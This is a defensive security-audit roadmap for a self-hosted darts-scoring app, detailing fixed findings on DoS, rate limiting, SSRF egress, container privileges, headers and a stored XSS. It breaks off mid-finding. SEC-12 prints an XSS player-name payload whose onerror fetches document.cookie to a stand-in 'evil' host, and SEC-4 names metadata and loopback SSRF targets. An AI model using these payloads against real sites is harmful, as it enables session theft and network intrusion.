# Security Audit Roadmap (adversarial whole-codebase review)

> **Status: SEC-1 through SEC-16 all fixed** (SEC-15 and SEC-16 fixed 2026-07 in the
> same pass that shipped `docs/bug-roadmap.md` BUG-4 through BUG-7). A second-pass
> audit (2026-07, after the Cricket / Doubles Practice / Just Chuckin' It /
> Ghost-mode expansion) opened three findings — SEC-12 (stored XSS), SEC-13
> (player-name bounds), SEC-14 (validate/bound write inputs), all now fixed — see
> "Part 4" below. A **third-pass audit** (2026-07, scoped to the newly-added
> tournament mode plus a re-check of the SEC-12 "zero bare `escapeJs`" invariant)
> opened **SEC-15** — see "Part 5". A **fourth-pass audit** (2026-07, a deliberate
> breadth-first re-read of the *whole* codebase weighted evenly across every module
> rather than the newest features — "make sure nothing slipped through the cracks")
> opened **SEC-16** (SSRF egress-guard bypass) — see "Part 6". A **fifth-pass audit**
> (2026-07, an adversarial re-read specifically hunting for unauthenticated inputs that
> reach an *unhandled* decode/parse and for write-side records the earlier passes
> hardened only at one consumer) opened **SEC-17** (unauthenticated `server_errors`
> diagnostic-log poisoning via client-controlled malformed input) — see "Part 7". A
> **sixth-pass audit** (2026-07, a general code-review pass covering the whole app —
> not scoped to one new feature — including the Guided Around the Clock/World and
> Checkout Trainer/League Mode expansions merged since Part 7) opened **SEC-18**
> through **SEC-24** — see "Part 8" at the bottom. Functional-defect counterparts live
> in `docs/bug-roadmap.md` (BUG-1/BUG-2/BUG-3 from the second pass; BUG-4/BUG-5 from
> the third; BUG-6/BUG-7 from the fourth; BUG-9 from the fifth; BUG-10 through BUG-15
> from the sixth).
>
> See the "Status" line
> under each finding below for what actually shipped, which in a couple of places is
> a more robust implementation than the original suggested fix — e.g. SEC-5 uses a
> root-briefly/chown/drop-to-non-root entrypoint rather than a bare `USER node`, so
> existing bind-mounted data directories keep working. **SEC-7 (2026-07)**: option 1
> from the brainstorm — folded `POST /api/ha-webhook` into the same `requireWrite`
> gate every other write endpoint already uses (`backend/server.js`) — a no-op (LAN
> trust, unchanged) when `OCHE_REQUIRE_AUTH` is off, admin-session-required when it's
> on, verified all three cases (off/anonymous, on/no-session→401, on/logged-in→200)
> against a live scratch server. Option 2 (moving webhook firing fully server-side)
> remains a possible future refinement, not required to close this finding.
>
> Produced by a full, character-by-character read of the codebase with a
> pretend-malicious mindset ("how do I break in and pivot into the rest of the
> network?"). Scope: `backend/server.js`, `backend/db.js`, `backend/auth.js`,
> `backend/backup.js`, `frontend/index.html`, `frontend/display.html`, `Dockerfile`,
> and the compose files.
>
> **How to use this doc:** each OPEN finding has a stable ID, a severity, the exact
> location (by function/file, not line number, so it survives edits), the concrete
> attack, a **step-by-step fix**, and a **verification** step. Work top-down in the
> "Suggested implementation order" at the bottom. Part 1 lists what's already fixed so
> you don't redo it; Part 3 lists what was checked and found safe so you don't waste
> effort there.

## Threat model

Single-household, self-hosted app that **may be exposed to the open internet** by
someone. The overriding goals, in order: (1) it must not become a pivot point into the
host's network, (2) it must not let an unauthenticated stranger corrupt data or take
the service down, (3) stats must stay accurate. There is only one class of credential
(admin accounts); "players" and "PINs" are not authentication.

## Severity legend

- **HIGH** — remotely exploitable by an unauthenticated attacker for data loss, takeover, or network pivot.
- **MED** — remotely exploitable for denial-of-service or requires a weaker precondition.
- **LOW** — defense-in-depth / hardening; needs an unlikely precondition or has limited impact.

---

## Part 1 — Already fixed (do NOT redo)

These were found and fixed in the audit that produced this doc. Listed so a follow-up
model doesn't re-report them. See `docs/security-hardening-roadmap.md` for detail.

- **Unauthenticated write endpoints** → `OCHE_REQUIRE_AUTH` env flag (zero-trust
  default: on) + `requireWrite()` gate on every write route in `server.js`. Reads
  stay public. `GET /api/auth-config` reports the flag; frontend prompts for login
  before gameplay/roster writes (routing to the setup wizard first if no admin
  account exists yet). Set `OCHE_REQUIRE_AUTH=false` to opt back into open-LAN
  behavior for a fully-trusted household network.
- **Player PINs enforced only in the UI** (a direct `POST /api/games/:id/turns` scored
  as a PIN-protected player) → mitigated by the auth gate above (PINs remain a UI
  convenience only; this is by design now, documented).
- **Stat reclassification on player delete / reset-all** → `games.player_count` frozen
  at creation and used for H2H-vs-practice classification instead of a live
  `COUNT(game_players)` subquery.
- **3-dart-average inflation / stat poisoning via malformed turns** → `addTurn()` now
  rejects turns with 0 darts or >3 darts and validates each dart's sector/multiplier.
- **Static-file path traversal guard** → switched from `startsWith(FRONTEND_DIR)` to a
  `path.relative()` check in `serveStatic()`.

---

## Part 2 — OPEN findings

### SEC-1 — Blocking `scryptSync` on every login attempt → CPU-exhaustion DoS  **(MED, unauthenticated)**

**Status: ✅ Fixed.** `auth.js` now wraps `crypto.scrypt` in a promise
(`hashSecret`/`verifySecret` are async); `login()`, `verifyPlayerPin()`,
`createFirstAdmin()`, `createAdmin()`, `changeAdminPassword()`, `setPlayerPin()` all
`await` it, and every caller in `server.js` awaits those. The dummy-hash constant-time
behavior on unknown usernames is preserved (computed lazily once, cached as a
promise, since a synchronous module-load-time call isn't possible for an async
function). `/api/login`, `/api/setup`, and `/api/players/verify-pin` each get their
**own** rate-limit bucket (`'login'`, `'setup'`, `'pin'` — not a single shared bucket
as the fix sketch below implies) at 10/60s/IP, so heavy legitimate PIN-verify traffic
during normal gameplay setup can't burn down the login budget. Verified: 200
concurrent bogus logins kept `GET /api/health` responding in ~10-20ms throughout, and
the 11th login attempt from one IP within a window correctly got 429.

**Where:** `backend/auth.js` `verifySecret()`/`hashSecret()` use `crypto.scryptSync`
(synchronous). `backend/db.js` `login()` runs it on **every** attempt, including a
dummy hash for unknown usernames (the anti-enumeration measure). `verifyPlayerPin()`
and `createFirstAdmin()` also call it.

**Attack:** Node is single-threaded. `scryptSync` blocks the event loop for ~50-100ms
per call. An unauthenticated attacker POSTing `/api/login` in a loop (usernames don't
need to exist — the dummy hash still runs) pins the CPU and stalls *all* other
requests, including the live scoreboard. Per-account lockout does not help: unknown
usernames have no lockout, and the work happens before any lockout branch.

**Fix (step by step):**
1. Add a small in-memory per-IP rate limiter (see SEC-3 — build it once, reuse here).
   Apply it to `/api/login`, `/api/setup`, and `/api/players/verify-pin` **before** any
   scrypt work runs. Suggested budget: 10 attempts / 60s / IP, then 429.
2. Switch the hashing to the **async** API so a single attempt no longer blocks the
   loop: in `auth.js`, add `verifySecretAsync`/`hashSecretAsync` using
   `crypto.scrypt(...)` wrapped in a Promise, and `await` them in `login()`,
   `verifyPlayerPin()`, `createFirstAdmin()`, `createAdmin()`, `changeAdminPassword()`.
   Keep the constant-time/dummy-hash behavior (still run the dummy hash on unknown
   users, just awaited).
3. Cap password length is already enforced (≤256) — keep it; scrypt cost scales with
   input, so this bound matters.

**Verify:** with a script firing 200 concurrent `/api/login` requests with a bogus
username, confirm (a) legitimate `GET /api/health` still responds within ~100ms
throughout, and (b) the attacker starts receiving 429 after the budget.

---

### SEC-2 — Unbounded SSE connections + unbounded live-state payload → resource-exhaustion DoS  **(MED)**

**Status: ✅ Fixed.** `MAX_SSE_TOTAL=50` and `MAX_SSE_PER_IP=5` in `server.js`; the
`/api/live/stream` handler returns 503 past either cap, and the per-IP count is
decremented on `req.on('close', ...)`. Went with "leave the stream public but cap it"
(option 3's simpler branch) rather than gating it behind `OCHE_REQUIRE_AUTH`, since the
display screen genuinely isn't logged in. `POST /api/live` now runs through
`sanitizeLiveState()`: only the top-level keys `liveSnapshot()` in `frontend/index.html`
actually produces are kept (everything else silently dropped), and the sanitized
result is rejected with 413 if it serializes past 64KB. Verified: a payload with a
2000-entry players array + a 5KB junk field → 413; a normal payload with one unknown
top-level key → 200 with that key stripped from the stored/broadcast state; opening 7
connections from one IP → first 5 accepted (200), next 2 rejected (503); closing
connections frees up the per-IP slot for a new one.

**Where:** `backend/server.js` — `liveClients` is a `Set` with no cap; `GET
/api/live/stream` adds a client per connection and is a **read**, so it is *not* gated
even when `OCHE_REQUIRE_AUTH` is on. `POST /api/live` stores whatever object is sent
into `liveState` (bounded only by `readJson`'s 1MB cap) and re-broadcasts it.

**Attack:** an unauthenticated client opens thousands of `/api/live/stream`
connections → file-descriptor / memory exhaustion and a growing per-heartbeat write
loop. Separately, a ~1MB `POST /api/live` is re-serialized and pushed to every client
on every update.

**Fix (step by step):**
1. Cap total SSE clients: `const MAX_SSE = 50;` in `server.js`. In the
   `/api/live/stream` handler, if `liveClients.size >= MAX_SSE`, respond `503` and
   return instead of adding the client.
2. Add a per-IP SSE connection cap (e.g. max 5 per IP) using the same IP map as SEC-3.
3. When `OCHE_REQUIRE_AUTH` is on, require an admin session for `/api/live/stream` too
   (the display screen would then need a login or a read-only view token — decide which;
   simplest is to leave the stream public but keep the caps above).
4. Shrink the accepted live payload: validate/whitelist the top-level shape in `POST
   /api/live` (only the fields `display.html` actually reads) rather than storing an
   arbitrary object; reject if it serializes beyond, say, 64KB.

**Verify:** open MAX_SSE+10 EventSource connections; confirm the extra ones get 503 and
existing clients keep receiving updates.

---

### SEC-3 — No HTTP rate limiting anywhere  **(MED, unauthenticated)**

**Status: ✅ Fixed.** `server.js` has a reusable `rateLimit(bucket, ip, max, windowMs)`
(bucketed, not a single global map keyed by IP alone — see SEC-1's note on why login/
setup/pin got separate buckets), `clientIp()` honoring `X-Forwarded-For` only when
`TRUST_PROXY=true`, a `tooManyRequests()` helper that sets `Retry-After`, and a loose
global budget (300/60s/IP) applied to every request before routing. Buckets are
pruned on a 60s unref'd interval. Verified with the SEC-1 tests above plus a direct
check that the `Retry-After` header is present and correct on a 429.

**Where:** `backend/server.js` — there is no per-IP throttling on any route. Only
per-account lockouts exist (admin login, player PIN).

**Attack:** unauthenticated flooding of any endpoint (login, verify-pin, `/api/live`,
stats reads) for brute force, data pollution (when auth is off), or plain DoS.

**Fix (step by step):**
1. Build one reusable limiter in `server.js`:
   ```js
   const rl = new Map(); // ip -> { count, resetAt }
   function rateLimit(ip, max, windowMs) {
     const now = Date.now();
     let e = rl.get(ip);
     if (!e || e.resetAt < now) { e = { count: 0, resetAt: now + windowMs }; rl.set(ip, e); }
     e.count++;
     return e.count <= max;
   }
   // periodic prune of expired entries (setInterval, unref'd)
   ```
2. Derive the client IP safely: default to `req.socket.remoteAddress`. Only honor
   `X-Forwarded-For` when an env flag like `TRUST_PROXY=true` is set (otherwise a
   client can spoof XFF to evade the limiter). Document this.
3. Apply a **strict** budget to auth endpoints (SEC-1) and a **loose** global budget
   (e.g. 300 req / 60s / IP) to everything else, returning `429` with a `Retry-After`.
4. Keep the limiter in-memory (matches the app's zero-dependency, single-process
   design); note it resets on restart and isn't shared across replicas (fine here).

**Verify:** exceed each budget from one IP and confirm 429s; confirm a second IP is
unaffected.

---

### SEC-4 — No egress restriction on the Home Assistant URL → SSRF / network pivot  **(MED→HIGH if internet-exposed)**

**Status: ✅ Fixed**, with the policy resolved as literally "always block
loopback/link-local, allow private by default" (the fix sketch below hedges between
two phrasings of an opt-out flag — resolved in favor of the "Recommended default"
paragraph): new `backend/netguard.js` exports `resolveAllowedHost(hostname)`, which
resolves once, rejects loopback/link-local (incl. `169.254.169.254`) unconditionally,
optionally also rejects private ranges when `HA_BLOCK_PRIVATE=true` (renamed from the
fix sketch's `HA_ALLOW_PRIVATE` — block-flag, not an allow-flag, since allow is the
default), and returns the single resolved IP for the caller to connect to (closing the
DNS-rebinding window). Both `fireHaWebhook()` (`db.js`) and `/api/ha-test`
(`server.js`) use it and connect to the resolved IP with the original hostname sent as
the `Host` header (and `servername` for TLS SNI on https). Verified against a real
running server: `http://169.254.169.254/`, `http://127.0.0.1:<port>/`, and
`http://localhost:<port>/` (resolves to loopback) were all rejected with a 400 and a
clear message; a private-LAN-shaped address (`192.168.1.250`) was allowed through to
attempt the connection (and correctly timed out, since nothing was listening there —
proving it wasn't blocked by policy).

**Where:** `backend/db.js` `fireHaWebhook()` and `backend/server.js` `/api/ha-test` —
both make outbound HTTP requests to the admin-configured `ha_url` with no restriction
on the destination host.

**Attack:** this is the exact "jumping-off point into the network" risk. Although the
destination is admin-set (not attacker-set), on an internet-exposed box an attacker who
phishes/guesses admin creds — or exploits any future write that can influence settings —
can point `ha_url` at `http://169.254.169.254/` (cloud instance-metadata, often
credential-bearing), `http://127.0.0.1:<port>` (other local services), or any RFC1918
address, then trigger `/api/ha-test` or a webhook and read/exfiltrate via timing/status.
Node's `http.request` does not follow redirects (good), but DNS rebinding is still
possible.

**Fix (step by step):**
1. Add a `isDisallowedHost(hostname, resolvedIp)` guard used by BOTH `fireHaWebhook` and
   `/api/ha-test`. Resolve the hostname (`dns.lookup`) and reject if the resolved IP is:
   loopback (`127.0.0.0/8`, `::1`), link-local (`169.254.0.0/16`, `fe80::/10`,
   especially `169.254.169.254`), or private (`10/8`, `172.16/12`, `192.168/16`,
   `fc00::/7`) — **unless** an explicit opt-out env flag (`HA_ALLOW_PRIVATE=true`) is set,
   since most real HA installs *are* on the LAN (so private ranges must be allowed by
   default for LAN, but blockable for hardened/public deployments). Recommended default:
   allow private LAN ranges (HA lives there) but **always** block loopback and
   link-local/metadata (`169.254.0.0/16`), which a real HA endpoint never uses.
2. Connect by the resolved IP (passing the original hostname in the `Host` header) to
   close the DNS-rebinding window between check and connect.
3. Keep the 5s timeout and the no-redirect behavior.

**Verify:** set `ha_url` to `http://169.254.169.254/` and confirm `/api/ha-test` refuses
with a clear error; confirm a normal LAN HA URL still works.

---

### SEC-5 — Container runs as root  **(MED, defense-in-depth)**

**Status: ✅ Fixed, with a more robust approach than the fix sketch below.** A bare
`USER node` (as suggested) would break every *existing* deployment on upgrade: Docker
bind mounts (`./darts_data:/data`, what `docker-compose.yml` actually uses) don't
inherit the image's ownership the way named/anonymous volumes do, so a freshly-created
or previously-root-owned host directory would leave the non-root process unable to
open its database at all. Instead: new `docker-entrypoint.sh` runs as root just long
enough to `chown` the (`DARTS_DB`-derived) data directory, then execs the real command
via `su-exec node` (a small static binary from Alpine's own package repo — not an
npm/JS dependency, doesn't affect the app's zero-dependency nature). `Dockerfile` adds
`apk add su-exec`, copies the entrypoint, and sets `ENTRYPOINT
["docker-entrypoint.sh"]`. **Verified against a real Docker daemon** (this sandbox
doesn't have network access to pull `node:22-alpine` from Docker Hub — a policy-level
403, not a config issue — so a literal `docker build` couldn't be completed here; the
entrypoint's actual mechanism was instead validated directly with the real `chown` +
`su-exec`-equivalent privilege-drop sequence against a real root-owned directory and
the real Node app: confirmed the app fails to even start as non-root against a
pre-existing root-owned dir without the chown step, and starts and writes its SQLite
DB correctly with it). `docker-compose.yml`/`docker-compose.dev.yml` add
`security_opt: [no-new-privileges:true]` (safe unconditionally); `read_only: true` /
`cap_drop: [ALL]` were deliberately **not** added — the entrypoint's `chown` step needs
`CAP_CHOWN`, and getting the exact minimal capability set right isn't something to
guess at without being able to test a real container build in this environment; a
wrong guess here would mean the container fails to start at all, which is worse than
not adding the extra hardening. `docker-compose.portainer.yml` (the no-build, bind-the-
whole-project-folder variant) is documented as staying root, since it has no build
step to run a chown/entrypoint against — see the comment added to that file.

**Where:** `Dockerfile` — no `USER` directive, so the process runs as root inside the
container. Any RCE (now or from a future dependency) would start as root.

**Fix (step by step):**
1. In `Dockerfile`, after copying app code, create/switch to the built-in non-root
   `node` user: ensure `/data` is writable by it.
   ```dockerfile
   RUN mkdir -p /data && chown -R node:node /usr/src/app /data
   USER node
   ```
   (`node:22-alpine` already ships a `node` user.)
2. Confirm the `/data` VOLUME is owned by `node` so SQLite can write there; if the host
   bind-mount (`./darts_data`) is root-owned, document that the operator must `chown` it
   or the container must map the right UID.
3. Consider `read_only: true` root filesystem in compose with `tmpfs` for anything
   transient, plus `cap_drop: [ALL]` and `security_opt: [no-new-privileges:true]`.

**Verify:** `docker exec oche id` shows a non-root UID; the app still reads/writes the DB.

---

### SEC-6 — Secure defaults not surfaced for public deployment  **(LOW→MED)**

**Status: ✅ Fixed.** `docker-compose.yml`, `docker-compose.dev.yml`, and
`docker-compose.portainer.yml` all now document `OCHE_REQUIRE_AUTH`, `TRUST_PROXY`,
and `HA_BLOCK_PRIVATE` with explanations of when to set each. `README.md` has a new
"Exposing this to the internet — checklist" section covering all of the above plus
the reverse-proxy/`COOKIE_SECURE` guidance, the non-root container, and the security
response headers (all on by default, nothing to configure). Step 3 (log a warning
when `COOKIE_SECURE` is false but the request looks like HTTPS via
`X-Forwarded-Proto`) was **not** implemented — it's speculative (marked "Optional" in
the fix sketch) and would require deciding whether to trust `X-Forwarded-Proto` by
default, which has the same spoofing consideration as `X-Forwarded-For`/
`TRUST_PROXY`; left as a possible future addition rather than guessed at here.
**Follow-up (2026-07): `OCHE_REQUIRE_AUTH` itself flipped from default-off to a
zero-trust default-on** — see the top-level Part 1 bullet above and
`docs/security-hardening-roadmap.md`; the compose files and README now reflect the
new default, with `OCHE_REQUIRE_AUTH=false` as the documented opt-out.

**Where (historical, at the time this finding was opened):** `docker-compose.yml` set
`COOKIE_SECURE=false` and did not mention `OCHE_REQUIRE_AUTH` at all; there was no TLS
in-app (relies on a reverse proxy).

**Fix (step by step, as originally scoped):**
1. Add `OCHE_REQUIRE_AUTH` to the compose `environment:` block with a note about when
   to set it.
2. Add a short "Exposing this to the internet" checklist to `README.md`: put it behind a
   TLS-terminating reverse proxy, set `COOKIE_SECURE=true`, set `TRUST_PROXY=true`
   (SEC-3) only if the proxy is trusted, and restrict the exposed port to the proxy.
3. Optional: if `COOKIE_SECURE` is false but the request arrived over HTTPS (via
   `X-Forwarded-Proto`), log a one-time warning.

**Verify:** doc/config review.

---

### SEC-7 — `POST /api/ha-webhook` is unauthenticated  **(MED)**

**Status: ✅ Fixed (2026-07).** Folded into the same `requireWrite` gate every other
write endpoint already uses — a plain `if (!requireWrite(req, res)) return;` at the
top of the route (`backend/server.js`). Behaves identically to every other write:
a no-op (stays open, LAN trust) when `OCHE_REQUIRE_AUTH` is off, requires a
logged-in admin session when it's on. Gameplay already requires login before this
can fire in that mode (`Auth.ensureCanWrite()` gates `startGame()` on the frontend),
so this closes the anonymous-trigger hole with zero new frontend prompt or UX
change. Verified against a live scratch server: off → 200 anonymously (unchanged);
on, no session → 401 (matches `POST /api/games`'s existing 401 in the same state);
on, logged in → 200. Option 2 (move webhook firing fully server-side, removing the
public trigger and the client's ability to forge payload fields) and option 3
(a signed capability token) remain possible future refinements — not needed to
close this finding, which only asked for "every payload attributable to an
authenticated session," and option 1 already delivers that.

**Where:** `backend/server.js` `/api/ha-webhook`.

**Attack (now closed):** an anonymous request could trigger the homeowner's HA
automations at will and inject arbitrary JSON fields into the outbound payload
(destination was still the admin-configured URL, so never arbitrary SSRF — that's
SEC-4).

---

### SEC-8 — Lockout enables griefing  **(LOW, accepted tradeoff — document)**

**Status: ✅ Documented (no functional change needed — this finding's own fix section
says "document the behavior either way").** SEC-3 now exists, so the per-IP `login`
bucket bounds how fast one attacker IP can throw failed attempts at any one account. A
code comment above `login()` in `db.js` records the tradeoff explicitly: per-account
lockout is left as-is (an attacker who knows a username can still grief that one
account via a slow-and-steady or multi-IP attempt sequence); a scheme that only locks
an account after ITS OWN IP has separately been throttled would be a real behavior
change with its own subtlety, out of scope for this pass.

**Follow-up (now done):** two companion roadmap docs picked up exactly this
tradeoff and the "what if the real admin gets fully locked out" worry it implies,
both now shipped — `docs/archive/admin-login-backoff-roadmap.md` replaced the flat
lockout with a progressive delay that doubles per consecutive failure past a
grace window and never produces a hard, unconditional block (a correct password
always works again once the wait elapses), and
`docs/archive/admin-account-recovery-roadmap.md` added a CLI recovery script for
the case a password is genuinely forgotten, which no lockout redesign fixes.

**Where:** `db.js` `login()` and `verifyPlayerPin()` lock an account for 5 min after N
failures.

**Attack:** an attacker who knows an admin username (or a player name) can deliberately
fail logins to keep that account locked out (a targeted DoS on that user).

**Fix:** this is an inherent tradeoff of account lockout. Once SEC-3 (per-IP limiting)
exists, prefer to lean on IP throttling and make the account lockout longer only after
IP throttling is exhausted, so a single attacker IP can't cheaply lock a victim.
Document the behavior either way.

---

### SEC-9 — Settings values not length-bounded  **(LOW)**

**Status: ✅ Fixed.** `PUT /api/settings` in `server.js` now rejects `ha_url` over 2048
characters and any `ha_webhook_*` field over 128 characters with a 400, before calling
`updateSettings`. Verified directly against a running server.

**Where:** `server.js` `PUT /api/settings` caps `card_tagline` (≤140) and the two
lockout thresholds, but `ha_url` and the webhook-ID fields are stored unbounded (admin
only).

**Fix:** cap each accepted string setting (e.g. `ha_url` ≤2048, webhook IDs ≤128) in the
allow-list validation before `updateSettings`. Reject over-length with 400.

**Verify:** oversized value returns 400.

---

### SEC-10 — No security response headers  **(LOW, hardening)**

**Status: ✅ Fixed**, using approach (a) from the fix sketch. `server.js` defines
`SECURITY_HEADERS` (`X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`,
`X-Frame-Options: DENY`, and a CSP: `default-src 'self'; script-src 'self'
'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self';
frame-ancestors 'none'; base-uri 'self'; form-action 'self'`) and applies it in `send()`
(covering every API response and, since `serveStatic()` also calls `send()`, every
static file too) and explicitly on the `/api/live/stream` SSE response. Verified with a
real Playwright run of a full game (start → throw darts → 180 → enter turn) plus the
`/display` scoreboard page: zero CSP violations logged by the browser, confirming the
inline `<script>`/`onclick` handlers and Google Fonts loading are unaffected. Approach
(b) — removing inline JS/handlers entirely for a strict nonce-based CSP — remains a
separate, larger follow-up, not attempted here.

**Where:** `server.js` `send()`/`serveStatic()` set only `Content-Type`.

**Fix (step by step):**
1. Add to all responses: `X-Content-Type-Options: nosniff`,
   `Referrer-Policy: no-referrer`, `X-Frame-Options: DENY` (or a `frame-ancestors` CSP).
2. Add a Content-Security-Policy. Note: both HTML files use **inline** `<script>` and
   inline event handlers (`onclick=...`), plus Google Fonts. A strict CSP would break
   them, so either (a) accept `script-src 'self' 'unsafe-inline'` (weak but still blocks
   injected external script origins) or (b) as a larger follow-up, move inline JS to
   external files and inline handlers to `addEventListener`, then use a nonce/`'self'`
   CSP. Pick (a) now, track (b) separately.
3. `font-src`/`style-src` must include the Google Fonts origins already used.

**Verify:** response headers present; app still loads and fonts render.

---

### SEC-11 — Error responses echo `err.message` to the client  **(LOW)**

**Status: ✅ Fixed.** The top-level catch in `server.js` now returns `{ error: 'Server
error' }` for any response with `status >= 500`, while still returning the specific
`err.message` for 4xx (the existing app-authored `httpError()` messages, which are
meant to be shown to the user). The detailed error is still logged server-side via
`console.error` exactly as before. Verified: a malformed-JSON request body (a real
unhandled `JSON.parse` throw, not an `httpError`) now returns `{"error":"Server
error"}` instead of the raw parse-error message; a normal 404 ("Player not found")
still returns its specific message.

**Where:** `server.js` top-level catch returns `err.message` for any error.

**Attack:** low impact (messages are app-authored `httpError` strings, not stack
traces), but a future unhandled error could leak internal detail.

**Fix:** for `status >= 500` (or missing status), return a generic `"Server error"` to
the client and keep the detailed log server-side (the server-side `console.error` is
already there). Continue returning specific messages for 4xx.

**Verify:** force an unexpected throw; client sees the generic message, logs show detail.

---

## Part 3 — Checked and found SAFE (don't spend effort here)

- **SQL injection:** every query is parameterized. The only string-interpolated SQL is
  (a) the constant H2H/practice classification fragments (no user input), and (b) in
  `getMetricHistory`, the `tz` (validated integer in `[-840,840]`) and `start`/`end`
  (validated `^\d{4}-\d{2}-\d{2}$` in both `server.js` and `bld()`). No injection path.
- **XSS:** user-controlled strings go through `escapeHtml` (text/`"`-attributes) and
  `escapeJs` (JS-string args in `onclick`), or `textContent` in `display.html`. There
  are **no** single-quoted HTML attributes with interpolation (checked), so
  `escapeHtml` not escaping `'` is not exploitable. The untrusted `/api/live` payload is
  fully escaped/coerced in `display.html`.
- **Prototype pollution:** `PUT /api/settings` writes only allow-listed keys;
  `updateSettings` stringifies keys into DB rows (no object-prototype write). `liveState`
  from JSON.parse is stored/serialized, never merged into a prototype.
- **Auth primitives:** scrypt + random salt, `timingSafeEqual`, session tokens random
  and SHA-256-hashed at rest, `HttpOnly`+`SameSite=Strict` cookies (CSRF-safe for the
  state-changing verbs, which are all POST/PUT/DELETE), sessions invalidated on password
  change. Sound. (The blocking nature of scrypt was the one real issue here — SEC-1,
  now fixed.)
- **Path traversal:** fixed (`path.relative`), re-verified with `curl --path-as-is`.
- **Daily-challenge seed:** `Math.abs()` returns a positive double even for INT32_MIN;
  no negative-modulo crash.

---

## Suggested implementation order

1. ~~**SEC-3** (build the reusable per-IP rate limiter) — unblocks SEC-1 and SEC-2.~~ ✅
2. ~~**SEC-1** (async scrypt + rate-limit auth) — highest unauthenticated-DoS payoff.~~ ✅
3. ~~**SEC-2** (SSE caps + bounded live payload).~~ ✅
4. ~~**SEC-4** (HA egress guard) — the network-pivot risk the deployment cares most about.~~ ✅
5. ~~**SEC-5** (non-root container) + **SEC-6** (secure-default docs/compose).~~ ✅
6. ~~**SEC-7** (decide + implement webhook auth — agree first).~~ ✅
7. ~~**SEC-9, SEC-10, SEC-11** (bounded settings, headers, generic 5xx) — quick hardening.~~ ✅
8. ~~**SEC-8** (revisit lockout vs. IP throttling once SEC-3 lands).~~ ✅ (documented)

**Every finding in the ORIGINAL audit (SEC-1..SEC-11) is closed.** Part 4 below
tracks a later second pass.

## Standing practice

Every new endpoint: decide read vs. write (gate writes via `requireWrite`), bound every
accepted input, and rate-limit anything that does expensive work (crypto, outbound
requests, or DB writes) before that work runs. Every new outbound request: run it
through the SEC-4 egress guard. Every new credential/secret: write-only handling +
brute-force protection (see `docs/security-hardening-roadmap.md`).

---

## Part 4 — Second-pass audit (2026-07, after the game-modes expansion)

A fresh adversarial read of the whole codebase after Cricket, Doubles Practice, Just
Chuckin' It, Ghost mode, the expanded Daily Challenge, and the many new stat/leaderboard
endpoints were added. Same threat model and severity legend as the top of this doc. The
SQLi/auth-primitive/path-traversal/CSRF surfaces were re-checked and remain safe (see
Part 3). Three new findings:

### SEC-12 — Stored XSS via a player name in Settings → PIN management  **(MED, unauthenticated in the default config)**

**Status: ✅ Fixed.** `renderPinPlayersList()`'s two handlers now wrap the player
name as `escapeHtml(escapeJs(n))`, matching every other `onclick` site in the file.
The two admin-username handlers (`askChangeAdminPassword`/`askDeleteAdmin`) got the
same defense-in-depth wrap even though they were never exploitable (usernames are
regex-restricted). Confirmed zero remaining bare `escapeJs(` call sites in the file
(a grep for `escapeJs(` not preceded by `escapeHtml(` returns nothing). Verified
live against a running server: created a player named
`x"><img src=x onerror=window.__xss=true>`, opened Settings → PIN management,
confirmed `window.__xss` stayed `false`, no dialog fired, and the name rendered as
literal escaped text (`&quot;&gt;&lt;img...&gt;`) in both the `onclick` attribute
and the visible label.

**Where:** `frontend/index.html` `renderPinPlayersList()` (the two `onclick` handlers
that call `askSetPlayerPin(...)` / `askRemovePlayerPin(...)`). They interpolate a player
name into a **double-quoted** `onclick="..."` attribute using **`escapeJs(n)` only**:

```js
onclick="askSetPlayerPin('${escapeJs(n)}')"
```

`escapeJs()` escapes `\` and `'` but **not** `"`, `<`, or `>`. Every *other* `onclick`
site in the same file wraps the value as `escapeHtml(escapeJs(name))` (e.g. the
player-list/profile handlers at lines ~3014, ~3118, ~6176) — this one site is missing the
outer `escapeHtml`, so it's inconsistent with the file's own established safe pattern.

**Attack:** player names have **no charset restriction** server-side (`addPlayer()` in
`db.js` only does `String(name).trim()` + non-empty). With `OCHE_REQUIRE_AUTH=false`
(the open-LAN opt-out), **anyone** can `POST /api/players` with a name like:

```
x"><img src=x onerror=fetch('//evil/'+document.cookie)>
```

`roster` on every client is populated from `GET /api/players` (`index.html` ~line 1247),
so the poisoned name reaches every admin. When an admin opens **Settings → PIN
management**, the un-escaped `"` closes the `onclick` attribute, `>` closes the `<button>`,
and the injected `<img onerror>` executes **in the admin's authenticated session** — no
click required. The session cookie is `HttpOnly` (so it can't be read by `document.cookie`),
but the injected script can still call any admin API directly (create a new admin, change
a password, wipe data) using the admin's ambient session. This is an anonymous → admin
privilege escalation. (Verified by reproducing the exact rendered string: the current
helper emits a live `<img onerror>`; `escapeHtml(escapeJs(n))` renders it inert as
`&quot;&gt;&lt;img...&gt;`.)

Note: under the zero-trust default (`OCHE_REQUIRE_AUTH=true`), only admins can create
players, so the cross-privilege angle narrows — but the fix is trivial and
defense-in-depth says escape regardless (a name could have been planted before auth
was enabled, or under the `false` opt-out).

**Fix (step by step):**
1. In `renderPinPlayersList()`, change both handlers to the same pattern the rest of the
   file already uses: `onclick="askSetPlayerPin('${escapeHtml(escapeJs(n))}')"` (and the
   Remove-PIN one). Nothing else changes — the display `<span>` already uses
   `escapeHtml(n)` correctly.
2. Harden the two admin-username handlers (`askChangeAdminPassword` / `askDeleteAdmin`,
   lines ~2289-2290) the same way. They're **not** exploitable today (usernames are
   restricted to `^[A-Za-z0-9_.-]{3,32}$`, so no `"`), but wrapping them in `escapeHtml`
   removes the "safe only because of a validator elsewhere" coupling.
3. Consider a lint/grep guard: any `escapeJs(` that isn't inside `escapeHtml(escapeJs(`
   is a smell. There should be zero.

**Verify:** create a player named `x"><img src=x onerror=alert(1)>`, open Settings → PIN
management, confirm no alert fires and the name renders literally.

---

### SEC-13 — Player names have no server-side length or shape bound  **(LOW)**

**Status: ✅ Fixed.** New `validatePlayerName()` in `db.js` (used by `addPlayer()`,
`ensurePlayer()` — so it also covers `setOut()`, `createGame()`'s player-adding loop,
and `addTurn()`'s auto-create path — and `renamePlayer()`'s new name): rejects empty,
over-64-character, or control-character-containing names with a 400. Charset stays
permissive (apostrophes/emoji still allowed) per the fix sketch's own reasoning —
tested explicitly (`db.players-and-settings.test.js`). No frontend `maxlength` was
added (optional UX polish, not required to close the finding — the server-side bound
is what matters for the threat model).

**Where:** `db.js` `addPlayer()` / `renamePlayer()` / `ensurePlayer()` — a name is only
